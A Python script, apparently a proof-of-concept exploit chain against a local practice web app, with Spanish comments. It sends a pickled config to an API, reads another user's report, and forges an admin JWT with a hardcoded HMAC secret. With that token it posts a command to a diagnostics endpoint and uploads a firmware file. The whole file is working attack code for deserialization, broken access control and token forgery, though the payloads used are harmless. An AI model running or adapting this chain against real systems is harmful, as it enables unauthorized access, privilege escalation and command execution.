import base64
import pickle
import json
import hmac
import hashlib
import urllib.request
import urllib.parse

SECRET = b'secret123'
BASE = 'http://localhost:5000'

# 1. Enviar configuracion serializada
config = {'threshold': 900}
payload = base64.b64encode(pickle.dumps(config))
req = urllib.request.Request(BASE + '/api/sensor_config', data=payload)
urllib.request.urlopen(req)
print('Config enviada')

# 2. Acceder a informe ajeno
print('Informe 3:')
print(urllib.request.urlopen(BASE + '/reports/3').read().decode())

# 3. Login normal para obtener token
login_data = urllib.parse.urlencode({'username': 'user', 'password': 'pass'}).encode()
req = urllib.request.Request(BASE + '/login', data=login_data)
resp = urllib.request.urlopen(req)
cookie = resp.headers.get('Set-Cookie')
token = cookie.split('=')[1].split(';')[0]
print('Token original:', token)

# 4. Modificar el token para ser admin
header_b64, payload_b64, sig_b64 = token.split('.')
payload = json.loads(base64.urlsafe_b64decode(payload_b64 + '=='))
payload['role'] = 'admin'
new_payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
message = f'{header_b64}.{new_payload_b64}'.encode()
sig = hmac.new(SECRET, message, hashlib.sha256).digest()
new_sig = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
admin_token = f'{header_b64}.{new_payload_b64}.{new_sig}'
print('Token modificado:', admin_token)

# 5. Ejecutar comando
cmd_data = urllib.parse.urlencode({'cmd': 'echo prueba'}).encode()
req = urllib.request.Request(BASE + '/diagnostics/run_test', data=cmd_data, headers={'Cookie': f'token={admin_token}'})
print('Run test resp:', urllib.request.urlopen(req).read().decode())

# 6. Subir firmware
boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
body = (f'--{boundary}\r\nContent-Disposition: form-data; name="firmware"; filename="test.bin"\r\n'
        f'Content-Type: application/octet-stream\r\n\r\n1234\r\n--{boundary}--\r\n').encode()
req = urllib.request.Request(BASE + '/firmware/update', data=body,
                            headers={'Content-Type': f'multipart/form-data; boundary={boundary}',
                                     'Cookie': f'token={admin_token}'})
print('Firmware resp:', urllib.request.urlopen(req).read().decode())

